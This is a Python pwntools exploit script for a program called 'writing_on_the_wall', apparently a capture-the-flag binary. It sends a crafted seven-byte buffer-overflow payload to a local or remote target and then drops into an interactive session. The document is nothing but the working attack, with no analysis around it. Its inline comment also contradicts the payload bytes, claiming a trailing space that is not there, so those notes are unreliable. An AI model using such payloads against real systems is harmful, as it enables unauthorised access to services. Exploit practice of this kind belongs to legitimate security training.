#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './writing_on_the_wall'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    # 6 chars for buffer + 1 to overwrite next byte (likely LSB of saved value)
    return b'\x00\x13\x37\x13\x37\x42\x00'  # includes the trailing space (0x20)

def trigger_exploit(p, payload):
    p.sendafter(b'>>', payload)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for 'writing_on_the_wall'")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)

    p.interactive()

if __name__ == "__main__":
    main()
